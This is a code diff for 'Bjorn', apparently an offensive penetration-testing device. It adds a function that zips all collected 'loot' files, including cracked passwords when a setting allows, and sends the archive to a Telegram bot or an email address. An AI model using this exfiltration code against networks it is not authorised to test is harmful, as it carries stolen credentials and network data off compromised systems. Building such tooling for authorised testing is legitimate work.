@@ -12,6 +12,7 @@ import csv
 import json
 import time
 import uuid
+import zipfile
 import smtplib
 import hashlib
 import urllib.error
@@ -45,6 +46,13 @@ def send_message(token, chat_id, text):
     return _do(urllib.request.Request(_api_url(token, "sendMessage"), data=data))
 
 
+def _subtype_for(filename):
+    """MIME subtype from the extension. Both senders used to hardcode "json", which was fine while
+    the only payload was the report — a zip announced as application/json is mislabelled, and mail
+    clients (unlike Telegram) act on that."""
+    return "zip" if str(filename).lower().endswith(".zip") else "json"
+
+
 def _multipart_encode(fields, filename, content):
     """Build a multipart/form-data body for sendDocument. Pure/testable. `content` is bytes."""
     boundary = "----BjornBoundary" + uuid.uuid4().hex
@@ -53,7 +61,8 @@ def _multipart_encode(fields, filename, content):
         parts.append(f'--{boundary}\r\nContent-Disposition: form-data; name="{k}"\r\n\r\n{v}\r\n'
                      .encode("utf-8"))
     parts.append(f'--{boundary}\r\nContent-Disposition: form-data; name="document"; '
-                 f'filename="{filename}"\r\nContent-Type: application/json\r\n\r\n'.encode("utf-8"))
+                 f'filename="{filename}"\r\n'
+                 f'Content-Type: application/{_subtype_for(filename)}\r\n\r\n'.encode("utf-8"))
     parts.append(content if isinstance(content, bytes) else content.encode("utf-8"))
     parts.append(f"\r\n--{boundary}--\r\n".encode("utf-8"))
     return b"".join(parts), f"multipart/form-data; boundary={boundary}"
@@ -91,8 +100,8 @@ def send_email(shared_data, subject, body, filename=None, content_bytes=None):
     msg["Subject"] = subject
     msg.set_content(body)
     if filename and content_bytes:
-        msg.add_attachment(content_bytes, maintype="application", subtype="json",
-                           filename=filename)
+        msg.add_attachment(content_bytes, maintype="application",
+                           subtype=_subtype_for(filename), filename=filename)
     # Explicit context on both paths: smtplib's own default for SMTP_SSL has historically been an
     # unverified stdlib context, which would accept any certificate.
     context = ssl.create_default_context()
@@ -197,6 +206,135 @@ def compile_targets(shared_data, include_creds=True):
     if include_creds:
         data["credentials"] = _collect_creds(shared_data.crackedpwddir)
     return data
+
+
+# ---------------------------------------------------------------------------
+# The "everything in one file" bundle
+# ---------------------------------------------------------------------------
+# compile_targets() above is the curated report: a fixed list of CSVs, as JSON, for an agent to
+# read. This is the other thing people want — every file Bjorn has actually collected, zipped, so
+# it can be pulled off the device in one go. Logs are deliberately NOT in it: they are diagnostics
+# rather than loot, and each page already exposes its own.
+BUNDLE_NAME = "bjorn_bundle.zip"
+# Telegram's bot sendDocument limit is 50 MB. Refuse a little under it and say so, rather than
+# posting a doomed multipart upload and reporting whatever Telegram says about the failure.
+TELEGRAM_MAX_BYTES = 45 * 1024 * 1024
+
+
+def bundle_path(shared_data):
+    """Where the compiled archive lives — in datadir, NOT under output_dir, so a rebuild never
+    tries to pack the previous bundle into the new one."""
+    return os.path.join(shared_data.datadir, BUNDLE_NAME)
+
+
+def has_content(path):
+    """True when a file holds actual data. Pure/testable.
+
+    A CSV with only its header is not "collected data" — every module creates its output file up
+    front, so a size check alone would bundle a dozen empty tables and make the archive look full.
+    """
+    try:
+        if os.path.getsize(path) == 0:
+            return False
+    except OSError:
+        return False
+    if not path.lower().endswith(".csv"):
+        return True
+    try:
+        with open(path, errors="replace") as f:
+            return sum(1 for line in f if line.strip()) > 1
+    except OSError:
+        return False
+
+
+def bundle_sources(shared_data, include_creds=True):
+    """[(arcname, path)] for every non-empty collected file. Pure apart from reading the tree."""
+    out = []
+    seen = set()
+
+    def add(path, arcname):
+        real = os.path.abspath(path)
+        if real in seen or not has_content(path):
+            return
+        seen.add(real)
+        # ZIP entry names are always forward-slash separated, whatever the host OS. os.path.relpath
+        # hands back backslashes on Windows, which made the reported names disagree with the
+        # archive's own listing — harmless on the Pi, wrong everywhere the report is read.
+        out.append((arcname.replace(os.sep, "/"), path))
+
+    for single in (shared_data.netkbfile, shared_data.livestatusfile):
+        add(single, os.path.basename(single))
+
+    crackedpwd = os.path.abspath(shared_data.crackedpwddir)
+    for dirpath, _dirs, files in os.walk(shared_data.output_dir):
+        # Cracked credentials obey the same rule as the report: they leave the device only when
+        # telegram_include_creds says so. The bundle is downloadable too, but it is the same file
+        # either way, and defaulting to "ship the passwords" because it might be a local download
+        # is not a call this should make quietly.
+        if not include_creds and os.path.abspath(dirpath).startswith(crackedpwd):
+            continue
+        for name in sorted(files):
+            full = os.path.join(dirpath, name)
+            add(full, os.path.relpath(full, shared_data.output_dir))
+    return out
+
+
+def compile_bundle(shared_data, include_creds=None):
+    """Zip every non-empty collected file into one archive. Returns (ok, detail, summary)."""
+    if include_creds is None:
+        include_creds = getattr(shared_data, "telegram_include_creds", True)
+    sources = bundle_sources(shared_data, include_creds)
+    if not sources:
+        return False, "nothing collected yet — every output file is empty", {}
+
+    path = bundle_path(shared_data)
+    try:
+        with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as zf:
+            for arcname, full in sources:
+                zf.write(full, arcname)
+    except OSError as e:
+        return False, f"could not write the archive: {e}", {}
+
+    size = os.path.getsize(path)
+    summary = {
+        "files": len(sources),
+        "bytes": size,
+        "creds_included": bool(include_creds),
+        "built": datetime.now(timezone.utc).isoformat(timespec="seconds"),
+        "names": [arc for arc, _ in sources],
+    }
+    return True, f"{len(sources)} file(s), {_human_size(size)}", summary
+
+
+def _human_size(n):
+    """Bytes until it is worth saying KB. "0 KB" for a real archive reads like a failure."""
+    return f"{n} B" if n < 1024 else (f"{n // 1024} KB" if n < 1024 * 1024
+                                      else f"{n / (1024 * 1024):.1f} MB")
+
+
+def bundle_summary(shared_data):
+    """What is on disk right now, for the page to show without rebuilding anything."""
+    path = bundle_path(shared_data)
+    try:
+        stat = os.stat(path)
+    except OSError:
+        return {"exists": False}
+    return {"exists": True, "bytes": stat.st_size,
+            "built": datetime.fromtimestamp(stat.st_mtime, timezone.utc).isoformat(timespec="seconds")}
+
+
+def send_bundle(shared_data):
+    """Send the already-compiled archive down whichever channel is configured. (ok, detail)."""
+    path = bundle_path(shared_data)
+    try:
+        with open(path, "rb") as f:
+            payload = f.read()
+    except OSError:
+        return False, "no bundle compiled yet — press Compile first"
+    if len(payload) > TELEGRAM_MAX_BYTES:
+        return False, (f"bundle is {len(payload) // (1024 * 1024)} MB, over the "
+                       f"{TELEGRAM_MAX_BYTES // (1024 * 1024)} MB limit — download it instead")
+    return _deliver(shared_data, f"Bjorn bundle ({_human_size(len(payload))})", BUNDLE_NAME, payload)
 
 
 def _signature(data):
